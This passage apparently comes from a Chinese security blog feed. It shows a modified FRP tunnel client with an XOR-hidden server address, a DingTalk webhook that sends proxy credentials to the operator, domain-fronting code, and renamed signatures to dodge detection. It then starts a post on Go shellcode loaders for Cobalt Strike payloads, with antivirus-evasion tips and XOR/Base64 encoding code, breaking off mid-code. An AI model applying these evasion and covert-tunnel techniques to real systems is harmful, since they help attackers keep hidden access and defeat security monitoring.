  port = <span class="string">&quot;7000&quot;</span>          <span class="comment"># CUCD</span></span><br><span class="line"></span><br><span class="line">    key = <span class="string">&quot;testkey&quot;</span></span><br><span class="line">    str2xor(ip, key)</span><br><span class="line">    str2xor(port, key)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>测试，其中服务端 IP<code>192.168.111.1</code>异或后为<code>E\AZZSAZTBEET</code>，端口<code>7000</code>异或为<code>CUCD</code>。异或后的字符串可能存在特殊字符<code>\</code>，因此建议使用双引号包裹</p><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-i7v0ajlr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-i7v0ajlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./frpc_linux_amd64_xor -t <span class="string">&quot;E\AZZSAZTBEET&quot;</span> -p <span class="string">&quot;CUCD&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-14.png" data-caption="FRP魔改-14"><img src="/assets/FRP%E9%AD%94%E6%94%B9-14.png" alt="FRP魔改-14"></a></p><p>其实这些都是在应用层进行加密混淆，实际上在网络层还是可以看到流量。因此，还需要进行例如域前置等操作来进一步隐藏</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-15.png" data-caption="FRP魔改-15"><img src="/assets/FRP%E9%AD%94%E6%94%B9-15.png" alt="FRP魔改-15"></a></p><h2 id="钉钉上线提醒"><a href="#钉钉上线提醒" class="headerlink" title="钉钉上线提醒"></a>钉钉上线提醒</h2><ul><li>在<code>frp/client/control.go#HandleNewProxyResp()</code>函数中填入钉钉机器人<code>AccessToken</code>和<code>Secret</code>，然后在前面硬编码的配置部分添加相关<code>plugin_user</code>和<code>plugin_passwd</code>即可。此处使用了<a href="https://github.com/wanghuiyt/ding">https://github.com/wanghuiyt/ding</a>，需要先下载依赖并导入，否则会编译失败<figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-400jaflr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-400jaflr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctl *Control)</span></span> HandleNewProxyResp(inMsg *msg.NewProxyResp) &#123;</span><br><span class="line">  xl := ctl.xl</span><br><span class="line">  <span class="comment">// Server will return NewProxyResp message to each NewProxy message.</span></span><br><span class="line">  <span class="comment">// Start a new proxy handler if no error got</span></span><br><span class="line">  err := ctl.pm.StartProxy(inMsg.ProxyName, inMsg.RemoteAddr, inMsg.Error)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    xl.Warn(<span class="string">&quot;[%s] start error: %v&quot;</span>, inMsg.ProxyName, err)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 配置钉钉机器人</span></span><br><span class="line">    dingAccessToken := <span class="string">&quot;&quot;</span></span><br><span class="line">    dingSecret := <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> dingAccessToken != <span class="string">&quot;&quot;</span> &amp;&amp; dingSecret != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">      addr := ctl.clientCfg.ServerAddr + inMsg.RemoteAddr</span><br><span class="line">      <span class="keyword">var</span> plugin_user <span class="type">string</span></span><br><span class="line">      <span class="keyword">var</span> plugin_passwd <span class="type">string</span></span><br><span class="line">      <span class="keyword">for</span> _, v := <span class="keyword">range</span> ctl.pxyCfgs &#123;</span><br><span class="line">        plugin_user = v.GetBaseInfo().LocalSvrConf.PluginParams[<span class="string">&quot;plugin_user&quot;</span>]</span><br><span class="line">        plugin_passwd = v.GetBaseInfo().LocalSvrConf.PluginParams[<span class="string">&quot;plugin_passwd&quot;</span>]</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      d := ding.Webhook&#123;</span><br><span class="line">        AccessToken: dingAccessToken,</span><br><span class="line">        Secret:      dingSecret,</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      _ = d.SendMessage(</span><br><span class="line">        <span class="string">&quot;Proxy：&quot;</span> + inMsg.ProxyName + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;Server：&quot;</span> + addr + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;Username：&quot;</span> + plugin_user + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;Password：&quot;</span> + plugin_passwd + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;Time：&quot;</span> + time.Now().Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xl.Info(<span class="string">&quot;[%s] start proxy success&quot;</span>, inMsg.ProxyName)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li></ul><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-16.png" data-caption="FRP魔改-16"><img src="/assets/FRP%E9%AD%94%E6%94%B9-16.png" alt="FRP魔改-16"></a></p><h2 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>网上看了很多关于 FRP 域前置的文章，发现很多文章都提到需要“通过 Websocket 协议让FRP用上域前置”，但大部分都是上来就是实现 WSS 协议（后续官方 v0.21.0 版本支持该协议：<a href="https://github.com/fatedier/frp/pull/1919/files">frp&#x2F;pull&#x2F;1919</a>），或者是修改 Websocket 相关第三方依赖包等等。很少有解释为什么要实现 Websocket 协议而不是直接使用 HTTP 协议，直到看到 <a href="https://sec.lz520520.com/2020/11/566/#0x03">frp改造3-CDN</a> 这篇文章：</p><blockquote><p>原来一直考虑的是在数据外封装一层 HTTP 协议来转发，<strong>但经过CDN转发会存在会话不一致的问题</strong>，因为本身也只是模拟 HTTP 协议，没法完全实现 HTTP 会话功能等<br>Websocket 只需要一次 HTTP 握手，后续整个通讯过程都是建立在一次连接&#x2F;状态中，交换的数据不再需要 HTTP 头</p></blockquote><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul><li><p>先在 Frp Client 所在机器修改本地 Hosts 文件来模拟 DNS 域名解析，然后修改配置使用 Websocket 协议</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-7hp55olr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-7hp55olr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/hosts</span></span><br><span class="line">192.168.111.1   cdn.naraku.local</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-aspcnqlr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-aspcnqlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = cdn.naraku.local</span><br><span class="line">server_port = 7000</span><br><span class="line">protocol = websocket</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 7788</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li><li><p>抓包并追踪 TCP 流量，可以看到该认证使用了 Websocket 协议</p></li></ul><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-17.png" data-caption="FRP魔改-17"><img src="/assets/FRP%E9%AD%94%E6%94%B9-17.png" alt="FRP魔改-17"></a></p><ul><li>如果要实现域前置，则还需要将 Host 修改为指定的回源域名。但是 FRP 默认 Host 是连接地址，虽然目前版本的 FRP 可以自定义添加 Header：<a href="https://gofrp.org/docs/features/http-https/header/">https://gofrp.org/docs/features/http-https/header/</a>，但是仅支持 HTTP 协议。而这里使用的是 Websocket 协议，因此需要修改相关依赖包代码</li></ul><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-18.png" data-caption="FRP魔改-18"><img src="/assets/FRP%E9%AD%94%E6%94%B9-18.png" alt="FRP魔改-18"></a></p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>在之前的版本中，FRP 是在<code>frp/pkg/util/net/websocket.go#ConnectWebsocketServer()</code>方法中调用了 Websocket，而该方法在 <a href="https://github.com/fatedier/frp/commit/ea568e8a4fdb979748e4d456e24344eeacc8d275#diff-18fae72f604db6cec11d4cd1f495e763ebb0303f495aac4571d72daa219aaf2c">frp&#x2F;commit&#x2F;ea568e</a> 中被移到了<code>frp/pkg/util/net/conn.go#DialWebsocketServer()</code>，然后又在 <a href="https://github.com/fatedier/frp/commit/70f4caac238aabee33583ea2aaf6d39dc2c5a455#diff-7f5151345cf11377d67d1870775b9acdb29991d06a9dced1ab04abbafc78cea2">frp&#x2F;commit&#x2F;70f4ca</a> 又移到了<code>frp/pkg/util/net/dial.go#DialHookWebsocket()</code>方法。下面主要围绕如下两个方法进行改动：<br><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-19.png" data-caption="FRP魔改-19"><img src="/assets/FRP%E9%AD%94%E6%94%B9-19.png" alt="FRP魔改-19"></a></p><p>跟进<code>websocket.NewConfig()</code>，跳转到<code>go/pkg/mod/golang.org/x/net@v0.0.0-20210428140749-89ef3d95e781/websocket/client.go#NewConfig()</code><br><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-20.png" data-caption="FRP魔改-20"><img src="/assets/FRP%E9%AD%94%E6%94%B9-20.png" alt="FRP魔改-20"></a></p><p>这里如果想从配置文件中读取回源域名 Host 的话，改动的地方比较多。例如需要先从<code>frp/cmd/frpc/sub/root.go#RegisterCommonFlags()</code>中注册变量，然后在<code>models/config/client_common.go#ClientCommonConf&#123;&#125;</code>结构体中新增属性，然后在一系列调用函数中新增该参数，相对比较麻烦。详细可参考：<a href="https://xz.aliyun.com/t/11460#toc-2">https://xz.aliyun.com/t/11460#toc-2</a><br>这里考虑到回源 Host 不会经常变动，并且不会泄露敏感信息，所以选择将其硬编码在代码中。修改方法如下：</p><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-wqh5q5lr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-wqh5q5lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewConfig</span><span class="params">(server, origin <span class="type">string</span>)</span></span> (config *Config, err <span class="type">error</span>) &#123;</span><br><span class="line">config = <span class="built_in">new</span>(Config)</span><br><span class="line">config.Version = ProtocolVersionHybi13</span><br><span class="line">config.Location, err = url.ParseRequestURI(server)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">config.Origin, err = url.ParseRequestURI(origin)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">config.Header = http.Header(<span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>][]<span class="type">string</span>))</span><br><span class="line">config.Header.Set(<span class="string">&quot;Host&quot;</span>, <span class="string">&quot;test.baidu.local&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>然后跟进<code>DialHookWebsocket() &gt; websocket.NewClient() &gt; hybiClientHandshake()</code>，跳转到<code>go/pkg/mod/golang.org/x/net@v0.0.0-20210428140749-89ef3d95e781/websocket/hybi.go#hybiClientHandshake()</code><br><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-21.png" data-caption="FRP魔改-21"><img src="/assets/FRP%E9%AD%94%E6%94%B9-21.png" alt="FRP魔改-21"></a></p><p>这里是 WSS 协议配置 Host 的地方，默认的 Host 是请求地址。这里主要实现从请求头中获取<code>Host</code>属性，如果存在则进行赋值，覆盖掉前面的默认值。修改如下：</p><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-wo6rxdlr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-wo6rxdlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hybiClientHandshake</span><span class="params">(config *Config, br *bufio.Reader, bw *bufio.Writer)</span></span> (err <span class="type">error</span>) &#123;</span><br><span class="line">bw.WriteString(<span class="string">&quot;GET &quot;</span> + config.Location.RequestURI() + <span class="string">&quot; HTTP/1.1\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// According to RFC 6874, an HTTP client, proxy, or other</span></span><br><span class="line"><span class="comment">// intermediary must remove any IPv6 zone identifier attached</span></span><br><span class="line"><span class="comment">// to an outgoing URI.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// FRP Websocket Host</span></span><br><span class="line">host := config.Location.Host</span><br><span class="line"><span class="keyword">if</span> tmpHost := config.Header.Get(<span class="string">&quot;Host&quot;</span>); tmpHost != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">host = tmpHost</span><br><span class="line">&#125;</span><br><span class="line">bw.WriteString(<span class="string">&quot;Host: &quot;</span> + removeZone(host) + <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"><span class="comment">// bw.WriteString(&quot;Host: &quot; + removeZone(config.Location.Host) + &quot;\r\n&quot;)</span></span><br><span class="line"></span><br><span class="line">bw.WriteString(<span class="string">&quot;Upgrade: websocket\r\n&quot;</span>)</span><br><span class="line">bw.WriteString(<span class="string">&quot;Connection: Upgrade\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>修改<code>root.go#getFileContent()</code>函数，启用 Websocket 协议，并关闭 TLS 方便调试，如下：<br><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-22.png" data-caption="FRP魔改-22"><img src="/assets/FRP%E9%AD%94%E6%94%B9-22.png" alt="FRP魔改-22"></a></p><p>运行，可以看到 Host 已经改变</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-der7qdlr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-der7qdlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./frpc_0.44.0_linux_amd64 -t <span class="string">&quot;E\AZZSAZTBEET&quot;</span> -p <span class="string">&quot;CUCD&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-23.png" data-caption="FRP魔改-23"><img src="/assets/FRP%E9%AD%94%E6%94%B9-23.png" alt="FRP魔改-23"></a></p><p>这里还有一个比较明显的特征<code>/~!frp</code>，修改<code>pkg/util/net/websocket.go</code>中<code>FrpWebsocketPath</code>变量即可</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-slzn9hlr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-slzn9hlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const (</span><br><span class="line">FrpWebsocketPath = <span class="string">&quot;/~!json&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="免杀测试"><a href="#免杀测试" class="headerlink" title="免杀测试"></a>免杀测试</h2><ul><li>直接编译，原生免杀，但是还是有部分厂商查出，应该是提取了 FRP 的样本特征：<a href="https://www.virustotal.com/gui/file/8a68d600d6c009f10a33eac67871f418f23120469111dc8656b7abb0d33fca49">https://www.virustotal.com/gui/file/8a68d600d6c009f10a33eac67871f418f23120469111dc8656b7abb0d33fca49</a></li></ul><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-24.png" data-caption="FRP魔改-24"><img src="/assets/FRP%E9%AD%94%E6%94%B9-24.png" alt="FRP魔改-24"></a></p><ul><li>UPX，好像用处不大：<a href="https://www.virustotal.com/gui/file/2a19b78afc7c62f121108ecd6dde950dd8a5bccb8b5c3059dbc2de372e9fbd54">https://www.virustotal.com/gui/file/2a19b78afc7c62f121108ecd6dde950dd8a5bccb8b5c3059dbc2de372e9fbd54</a></li></ul><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-25.png" data-caption="FRP魔改-25"><img src="/assets/FRP%E9%AD%94%E6%94%B9-25.png" alt="FRP魔改-25"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://gofrp.org/docs/overview/">FRP官方文档</a></li><li><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">FRP改造计划</a></li><li><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%E7%BB%AD.html">FRP改造计划续</a></li><li><a href="https://sec.lz520520.com/2020/11/566/">frp改造3-CDN</a></li><li><a href="https://xz.aliyun.com/t/11460">frp改版-支持域前置</a></li><li><a href="https://github.com/Mdxjj/frp-free">https://github.com/Mdxjj/frp-free</a></li><li><a href="https://github.com/arugal/frp-notify">https://github.com/arugal/frp-notify</a></li><li><a href="https://github.com/wanghuiyt/ding">https://github.com/wanghuiyt/ding</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go免杀初探</title>
      <link href="/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html"/>
      <url>/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html</url>
      
        <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>Shellcode：指一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。</li><li>Raw：Raw文件是可以直接进行字节操作读取的，因此加载到内存较为方便。本文全部使用Cobaltstrike生成的<code>bin</code>文件</li></ul><p><a data-fancybox="gallery" data-src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-0.png" data-caption="Go免杀初探-0"><img src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-0.png" alt="Go免杀初探-0"></a></p><h3 id="程序内存空间"><a href="#程序内存空间" class="headerlink" title="程序内存空间"></a>程序内存空间</h3><p>在冯诺依曼的体系结构中，一个进程必须有：Text 代码段、Data 数据段、BSS 堆栈段</p><ul><li>Text（只读）：存放程序代码的区域，它是由编译器在编译连接时自动计算的。</li><li>Data（可读可写）：存放编译阶段（而非运行时）就能确定的数据，即通常所说的静态存储区。赋予初值的全局和静态变量、常量就是存在这个区域</li><li>BSS（可读可写）：通常是用来存储未初始化或初始化为 0 的全局变量、静态变量的内存区域<ul><li>Stack 栈：保存函数的局部变量和参数</li><li>Heap 堆：保存函数内部动态分配内存，即程序的动态变量</li></ul></li></ul><p><a data-fancybox="gallery" data-src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-1.png" data-caption="Go免杀初探-1"><img src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-1.png" alt="Go免杀初探-1"></a></p><ul><li>函数指针：指向函数的指针变量。程序编译时，每一个函数都有一个入口地址，该入口地址就是函数指针所指向的地址。函数指针有两个用途：调用函数和作为函数的参数。</li><li>函数指针声明：<code>void(*pFunction)()</code>，没有参数时可写成<code>void(*pFunction)(void)</code>。<ul><li>那么<code>pFunction</code>函数指针的原型就是 <code>void (*)()</code>，即把变量名去掉</li><li>对于一个给定的<code>entry</code>地址，要把它转换成为函数指针，就是<code>(void (*) ())entry</code></li><li>那么调用这个函数指针的方式就是<code>((void(*)())entry)()</code></li></ul></li></ul><h3 id="查杀与免杀"><a href="#查杀与免杀" class="headerlink" title="查杀与免杀"></a>查杀与免杀</h3><p>杀软通用的查杀姿势一般可以分为静态查杀、动态查杀以及云查杀，更好一点的杀软还拥有主动防御功能。</p><ul><li>静态查杀：主要有静态的签名查杀和启发式查杀<ul><li>签名查杀：<ul><li>从病毒体中提取的病毒特征码，逐个与程序文件比较</li><li>特征码是反病毒公司在分析病毒时，确定的只有该病毒才可能会有的一系列二进制串，由这些特征可以识别出病毒程序</li></ul></li><li>启发式查杀：虚拟机引擎和行为检测相结合，通过模拟执行， 分析程序行为的安全检测技术。</li></ul></li><li>行为查杀：杀软一般是对系统多个API进行了hook，如：注册表操作、添加启动项、添加服务、添加用户、注入、创建进程、创建线程、加载DLL等等。杀软除了进行hook关键API，还会对API调用链进行监控，如：申请内存，将shellcode加载进内存，再执行内存区域shellcode。</li><li>云查杀：<ul><li>云安全机制是一种新兴的安全查杀机制，不同的安全厂商的云安全查杀机制不一样。</li><li>360安全卫士基于云共享特征库扫描机制，电脑管家基于主动防御信誉云的扫描机制。</li></ul></li></ul><p>免杀</p><ul><li>静态免杀： 对抗基于特征的静态免杀比较简单，可以使用加壳改壳、添加&#x2F;替换资源文件、修改特征码、Shellcode 编码&#x2F;加密（AES&#x2F;DES&#x2F;Base64&#x2F;Xor），目的是去除ShellCode特征</li><li>行为免杀：API 替换、使用未被 Hook 的 API、直接系统调用、替换操作方式采用白加黑手段等</li></ul><h3 id="Go相关"><a href="#Go相关" class="headerlink" title="Go相关"></a>Go相关</h3><blockquote><p>Go编写的程序很多杀软都会报毒（哪怕是HelloWorld）</p></blockquote><ul><li>Tips：编码这块可使用 Xor 异或，不需要引入额外的包。因为 Go 编写的 Loader 体积较大，再引入包会更大</li><li>编译时经常会添加参数<code>-ldflags=&quot;-H windowsgui&quot;</code>，其作用是隐藏CMD窗口</li></ul><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-b0ntz6lr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-b0ntz6lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ go build -ldflags=<span class="string">&quot;-s -w -H=windowsgui&quot;</span> -o main.exe main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># -o 指定输出文件名</span></span><br><span class="line"><span class="comment"># -s -w 减小体积</span></span><br><span class="line"><span class="comment"># -H=windowsgui 隐藏窗口</span></span><br></pre></td></tr></table></div></figure><ul><li>默认<code>go build</code>的exe都是当前操作系统的可执行文件，如果需要跨平台，只需要指定目标操作系统的平台和处理器架构即可。</li></ul><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-g6c99jlr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-g6c99jlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译当前操作系统的可执行文件</span></span><br><span class="line">$ go build main.go</span><br><span class="line">$ go build -o &lt;Other_Name&gt; main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># 【无弹窗】Mac编译exe</span></span><br><span class="line">$ CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ GOOS=windows GOARCH=amd64 go build -ldflags <span class="string">&quot;-s -w -H=windowsgui&quot;</span> main.go</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h2><ul><li>Loader Tips：<ul><li>加载DLL，采用动态调用的方式，可以避免 IAT 的 Hook</li><li>不要直接申请 RWX (读写执行)的内存，可先申请 RW 内存，后面再改为可执行，杀软对 RWX 的内存很敏感</li><li>加载到内存的方法非常多，除了常见的<code>copy</code>和<code>move</code>还有<code>uuid</code>这种加载既能达到加密Shellcode 的效果，还能直接加载到内存</li><li>执行内存，还可以用回调来触发如 EnumChildWindows，参考：<a href="https://github.com/aahmad097/AlternativeShellcodeExec">AlternativeShellcodeExec</a></li><li>API调用中间可以插入一些没用的代码，打乱API调用</li><li>适当加一些 sleep，可以过一些沙箱</li></ul></li></ul><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><blockquote><p>由于反病毒软件对于默认生成的文件查杀较为严格，所以需要先对其进行混淆加密，然后再通过解密还原</p></blockquote><ul><li>这里使用XOR异或加密，加密部分可以自行修改，但后续解密部分需要做相应调整</li></ul><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-sh22qylr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-sh22qylr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = []<span class="type">byte</span>&#123;<span class="number">0x1b</span>, <span class="number">0x51</span>, <span class="number">0x11</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异或混淆加密,然后进行Base64编码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getEnCode</span><span class="params">(shellcode []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> xorShellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(shellcode); i++ &#123;</span><br><span class="line">xorShellcode = <span class="built_in">append</span>(xorShellcode, shellcode[i]^key[<span class="number">2</span>]^key[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64.StdEncoding.EncodeToString(xorShellcode)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件中读取Shellcode</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileShellCode</span><span 